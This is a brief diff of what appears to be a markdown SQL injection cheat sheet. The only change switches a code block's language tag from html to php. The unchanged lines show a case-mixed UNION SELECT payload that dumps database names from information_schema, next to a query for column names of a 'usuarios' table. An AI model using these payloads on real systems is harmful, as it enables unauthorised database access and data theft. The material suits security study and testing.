@@ -50,7 +50,7 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios';
 
 ### 💉 Web Injection: Extract `Database Names`, `Tables of a Database`, `Column Names`
 
-````html
+````php
 ## Database Names
 -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata 
 
